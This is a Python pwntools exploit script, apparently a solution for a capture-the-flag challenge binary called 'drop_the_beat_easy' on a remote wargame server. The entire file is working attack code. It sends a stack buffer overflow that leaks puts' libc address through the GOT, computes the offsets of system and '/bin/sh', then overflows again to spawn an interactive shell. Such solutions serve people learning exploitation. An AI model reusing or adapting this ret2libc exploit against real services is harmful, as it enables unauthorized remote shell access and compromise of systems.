from pwn import *

def exploit():
	#p = process("./drop_the_beat_easy")
	p = remote('prob.vulnerable.kr', 20002)
	binary = ELF("drop_the_beat_easy")
	puts_plt = binary.plt['puts']
	puts_got = binary.got['puts']
	main = binary.symbols["main"]
	padding = 104

	payload = ''
	payload += 'A' * padding
	payload += p32(puts_plt)
	payload += p32(main)
	payload += p32(puts_got)

	p.sendline('1')
	p.sendline(payload)
	p.recvuntil('AWESOME!\n')

	libc_leak = u32(p.recvline()[:4])
	log.info("Libc leak : {}".format(hex(libc_leak)))
	libc_base = libc_leak - 0x05f140
	log.info("Libc base : {}".format(hex(libc_base)))
	libc_system = libc_base + 0x03a940
	log.info("Libc system : {}".format(libc_system))
	libc_binsh = libc_base + 0x15902b
	log.info("Libc /bin/sh : {}".format(libc_binsh))
	#one_gadget = libc_base + 0x10a38c
	#log.info("One gadget addr : {}".format(hex(one_gadget)))

	payload = ""
	payload += "A" * padding
	payload += p32(libc_system)
	payload += "JUNK"
	payload += p32(libc_binsh)
	#gdb.attach(p, "b *main+312")

	p.sendline('1')
	p.sendline(payload)
	p.interactive()

if __name__ == "__main__":
	exploit()
